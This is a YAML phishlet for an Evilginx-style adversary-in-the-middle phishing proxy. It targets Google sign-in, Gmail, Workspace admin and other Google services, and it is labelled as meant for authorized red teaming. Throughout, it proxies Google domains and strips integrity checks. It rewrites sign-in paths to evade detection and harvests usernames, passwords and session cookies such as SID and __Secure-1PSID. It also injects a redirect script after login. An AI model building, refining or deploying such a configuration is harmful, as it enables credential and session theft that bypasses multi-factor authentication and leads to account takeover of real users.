# Google Super Phishlet - Google + Gmail + GSuite/Workspace
# For authorized red team testing only
# Version: 3.2.0 - December 2024

name: 'Google'
author: '∆N0M∆LY'
min_ver: '3.0.0'
redirect_url: 'https://google.com/'

proxy_hosts:
  # Core authentication
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  
  # Gmail
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'inbox', orig_sub: 'inbox', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  
  # GSuite / Google Workspace
  - {phish_sub: 'admin', orig_sub: 'admin', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'workspace', orig_sub: 'workspace', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'drive', orig_sub: 'drive', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'docs', orig_sub: 'docs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'sheets', orig_sub: 'sheets', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'slides', orig_sub: 'slides', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'calendar', orig_sub: 'calendar', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'meet', orig_sub: 'meet', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'chat', orig_sub: 'chat', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'contacts', orig_sub: 'contacts', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'keep', orig_sub: 'keep', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'sites', orig_sub: 'sites', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'groups', orig_sub: 'groups', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'vault', orig_sub: 'vault', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'currents', orig_sub: 'currents', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  
  # Other Google services
  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'photos', orig_sub: 'photos', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'cloud', orig_sub: 'cloud', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'console', orig_sub: 'console', domain: 'cloud.google.com', session: true, is_landing: false, auto_filter: true}
  
  # Static resources - critical for proper page rendering
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Standard domain replacements
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'admin.google.com', orig_sub: 'admin', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'drive.google.com', orig_sub: 'drive', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'docs.google.com', orig_sub: 'docs', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'calendar.google.com', orig_sub: 'calendar', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'meet.google.com', orig_sub: 'meet', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'chat.google.com', orig_sub: 'chat', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  
  # Remove integrity checks that break proxying
  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: 'integrity="sha', replace: 'xintegrity="sha', mimes: ['text/html']}
  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: ' crossorigin', replace: ' xcrossorigin', mimes: ['text/html']}

# Rewrite URLs for browser detection evasion
rewrite_urls:
  # Shorten signin identifier path
  - trigger:
      domains: ['accounts.google.com']
      paths: ['/signin/v2/identifier']
    rewrite:
      path: '/id'
      query:
        - key: 'tid'
          value: '{id}'

  # Shorten signin challenge path  
  - trigger:
      domains: ['accounts.google.com']
      paths: ['/signin/v2/challenge/pwd']
    rewrite:
      path: '/pwd'
      query:
        - key: 'tid'
          value: '{id}'

  # Shorten v3 signin identifier
  - trigger:
      domains: ['accounts.google.com']
      paths: ['/v3/signin/identifier']
    rewrite:
      path: '/auth'
      query:
        - key: 'tid'
          value: '{id}'

  # Shorten rejected page
  - trigger:
      domains: ['accounts.google.com']
      paths: ['/v3/signin/rejected']
    rewrite:
      path: '/blocked'
      query:
        - key: 'tid'
          value: '{id}'

  # Shorten batchexecute API endpoint (most important for evasion)
  - trigger:
      domains: ['accounts.google.com']
      paths: ['/v3/signin/_/AccountsSignInUi/data/batchexecute']
    rewrite:
      path: '/api/v1'
      query:
        - key: 'tid'
          value: '{id}'

  # ServiceLogin rewrite
  - trigger:
      domains: ['accounts.google.com']
      paths: ['/ServiceLogin']
    rewrite:
      path: '/login'
      query:
        - key: 'tid'
          value: '{id}'

auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', '1P_JAR', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', 'OSID', 'LSID', '.*,regexp']
  - domain: 'accounts.google.com'
    keys: ['GAPS', 'LSID', 'ACCOUNT_CHOOSER', '__Host-GAPS', '.*,regexp']
  - domain: 'mail.google.com'
    keys: ['GMAIL_AT', '.*,regexp']
  - domain: 'admin.google.com'
    keys: ['ADMIN_AT', '.*,regexp']
  - domain: '.google.com'
    keys: ['DRIVE_STREAM', '.*,regexp']

auth_urls:
  - '/signin/v2/challenge'
  - '/signin/v2/identifier'
  - '/v3/signin/identifier'
  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
  - '/ServiceLogin'
  - '/CheckCookie'
  - '/ManageAccount'
  - '/mail/'
  - '/mail/u/0/'
  - '/admin/'
  - '/a/'
  - '/drive/'
  - '/calendar/'

credentials:
  username:
    key: ''
    search: '([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
    type: 'post'
  password:
    key: ''
    search: '(?:AEThLl|password|Passwd)[^"]*"([^"]+)"'
    type: 'post'
  custom:
    - key: 'identifier_param'
      search: 'identifier=([^&]+)'
      type: 'post'
    - key: 'email_encoded'
      search: '%22([a-zA-Z0-9._%25+-]+%40[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})%22'
      type: 'post'

force_post:
  - path: '/signin/v2/challenge/pwd'
    search:
      - {key: 'TL', search: '.*'}
    force:
      - {key: 'continue', value: 'https://myaccount.google.com/'}
    type: 'post'
    
  - path: '/v3/signin/_/AccountsSignInUi/data/batchexecute'
    search:
      - {key: 'f.req', search: '.*'}
    force:
      - {key: 'continue', value: 'https://myaccount.google.com/'}
    type: 'post'

login:
  domain: 'accounts.google.com'
  path: '/ServiceLogin'

js_inject:
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/signin', '/ServiceLogin', '/v3/signin']
    script: |
      (function(){
        // Redirect to myaccount after successful login
        var checkLogin = setInterval(function() {
          if (document.cookie.includes('SID=') && document.cookie.includes('HSID=')) {
            clearInterval(checkLogin);
            setTimeout(function() {
              window.location.href = 'https://myaccount.google.com/';
            }, 1500);
          }
        }, 1000);
        
        // Auto-clear after 60 seconds
        setTimeout(function() { clearInterval(checkLogin); }, 60000);
      })();
